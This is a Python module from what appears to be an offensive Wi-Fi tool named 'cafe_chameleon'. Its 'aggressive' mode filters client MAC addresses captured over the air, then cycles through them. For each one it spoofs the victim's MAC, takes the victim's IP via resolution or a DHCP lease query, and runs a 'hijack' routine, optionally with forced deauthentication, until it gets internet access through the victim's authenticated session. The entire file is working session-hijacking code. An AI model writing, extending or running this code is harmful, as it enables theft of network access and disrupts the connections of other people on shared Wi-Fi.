"""
cafe_chameleon.modes.aggressive.air_target_handler - Over-the-air captured client filtering and testing loop.
"""

import ipaddress
import time

from cafe_chameleon.utils.process import _run
from cafe_chameleon.utils.signals import HijackSkipInterrupt
from cafe_chameleon.utils.state import set_restore_params
from cafe_chameleon.ui.console import (
    log_main,
    log_plus,
    log_hijack,
    log_step,
    log_wait,
    set_scan_status,
    set_hijack_status
)
from cafe_chameleon.ui.prompts import ask_proceed, ask_restore
from cafe_chameleon.network.internet import has_internet
from cafe_chameleon.network.sysfs import wait_for_carrier
from cafe_chameleon.network.hijack import hijack, restore
from cafe_chameleon.network.dhcp import query_dhcp_lease_ip
from cafe_chameleon.network.mac import set_mac_address
from cafe_chameleon.network.nmcli import lock_bssid
from cafe_chameleon.scanners.resolver import resolve_mac_to_ip, is_valid_ipv4


def filter_valid_air_clients(bssid_air_clients: dict, tried_macs: set, auto_params: dict, bssids: list) -> dict:
    gw_mac_clean = (auto_params.get("gateway_mac") or "").lower()
    local_mac_clean = (auto_params.get("local_mac") or "").lower()
    all_bssids_clean = {b["bssid"].lower() for b in bssids}

    def is_valid_client(m_clean):
        if m_clean in tried_macs or m_clean in all_bssids_clean or m_clean == gw_mac_clean or m_clean == local_mac_clean:
            return False
        if m_clean.startswith("01:00:5e") or m_clean.startswith("33:33") or m_clean.startswith("00:00:5e") or m_clean.startswith("02:00:00"):
            return False
        try:
            fb = int(m_clean.split(":")[0], 16)
            if fb & 1:
                return False
        except Exception:
            return False
        if len(m_clean) >= 14:
            pfx = m_clean[:14]
            for b in all_bssids_clean:
                if len(b) >= 14 and pfx == b[:14]:
                    return False
        return True

    return {
        mac: ip for mac, ip in bssid_air_clients.items()
        if is_valid_client(mac.lower())
    }


def test_air_client_targets(
    new_air_clients: dict,
    interface: str,
    target_bssid: str,
    chan: int,
    profile: str,
    tried_macs: set,
    auto_params: dict,
    args,
    security: str | None = None
) -> tuple[bool, bool]:
    """
    Impersonates each captured air target MAC address and tests for internet access.
    Returns (success_flag, stop_early_flag).
    """
    if not new_air_clients:
        return False, False

    log_step(f"Testing {len(new_air_clients)} air target(s)...")
    log_main(f"  -> Testing {len(new_air_clients)} air target(s)...")
    set_scan_status(scan_type="Idle")

    auto_ip = auto_params.get("local_ip") or "10.68.193.222"
    gw_ip = auto_params.get("gateway_ip", "")
    netmask = auto_params.get("cidr", "").split("/")[1] if auto_params.get("cidr") and "/" in auto_params.get("cidr") else "21"
    broadcast = auto_params.get("broadcast", "")
    local_mac = auto_params.get("local_mac", "")
    ipmask = auto_params.get("cidr", f"{auto_ip}/{netmask}")

    set_restore_params(interface, local_mac, ipmask, broadcast, gw_ip, callback=restore, profile=profile)

    force_deauth = getattr(args, "force_deauth", False)

    for client_mac, client_ip in new_air_clients.items():
        try:
            tried_macs.add(client_mac.lower())

            _run(f"ip addr flush dev {interface} scope global", debug=False)
            valid_air_ip = None
            if client_ip and is_valid_ipv4(client_ip, subnet_cidr=auto_params.get("cidr")):
                valid_air_ip = str(client_ip)

            set_hijack_status(ip=valid_air_ip or None, mac=client_mac, technique="Resolving Target IP", clear_section2=True)

            resolved_ip = valid_air_ip or resolve_mac_to_ip(client_mac, interface, target_subnet=auto_params.get("cidr"))
            
            if not resolved_ip:
                log_wait(f"Querying DHCP lease -> {client_mac}...")
                log_hijack(f"[*] Querying DHCP lease -> {client_mac}...")
                set_hijack_status(ip=None, mac=client_mac, technique="DHCP Lease Query")
                set_mac_address(interface, client_mac, profile=profile)
                if not wait_for_carrier(interface, timeout=6.0):
                    lock_bssid(target_bssid, profile)
                    wait_for_carrier(interface, timeout=6.0)
                resolved_ip = query_dhcp_lease_ip(interface, target_mac=client_mac)

                if not resolved_ip:
                    log_hijack(f"[*] DHCP fallback: running multi-stage L2/L3 probes as {client_mac}...")
                    set_hijack_status(ip=None, mac=client_mac, technique="L2/L3 Fallback Probes")
                    resolved_ip = resolve_mac_to_ip(client_mac, interface, target_subnet=auto_params.get("cidr"))

            target_ip = resolved_ip or auto_ip
            if resolved_ip:
                set_hijack_status(ip=resolved_ip, mac=client_mac, technique="IP Resolved")
            else:
                set_hijack_status(ip=None, mac=client_mac, technique="Using Fallback IP")

            if not wait_for_carrier(interface, timeout=6.0):
                lock_bssid(target_bssid, profile)
                wait_for_carrier(interface, timeout=6.0)

            hijack_success = hijack(
                interface, target_ip, client_mac, netmask, broadcast, gw_ip,
                max_retries=2, profile=profile, bssid=target_bssid, channel=chan,
                security=security, force_deauth=force_deauth
            )
            if hijack_success:
                log_main(f"\033[92m[+] SUCCESS! Internet active via {client_mac} [{target_bssid}]\033[0m")
                if not getattr(args, "force", False):
                    return True, True

            if getattr(args, "force", False):
                if not ask_proceed():
                    log_main("[-] Stopped after impersonation.")
                    has_acc = hijack_success or has_internet()
                    if ask_restore(default_restore=not has_acc):
                        restore(interface, local_mac, ipmask, broadcast, gw_ip)
                    else:
                        log_plus("Keeping current network config.")
                    return has_acc, True

            time.sleep(0.5)
        except HijackSkipInterrupt:
            log_hijack(f"\033[93m[-] Skipped target {client_mac}\033[0m")
            log_main(f"\033[93m[-] Skipped target {client_mac}\033[0m")
            set_hijack_status(ip=None, mac=None, technique="Idle")
            continue

    set_hijack_status(ip=None, mac=None, technique="Idle")

    has_acc = has_internet()
    if getattr(args, "force", False):
        if ask_restore(default_restore=not has_acc):
            restore(interface, local_mac, ipmask, broadcast, gw_ip)
        else:
            log_plus("Keeping current network config.")
    else:
        if not has_acc:
            restore(interface, local_mac, ipmask, broadcast, gw_ip)
        else:
            log_plus("Internet verified. Preserving configuration.")

    return has_acc, False
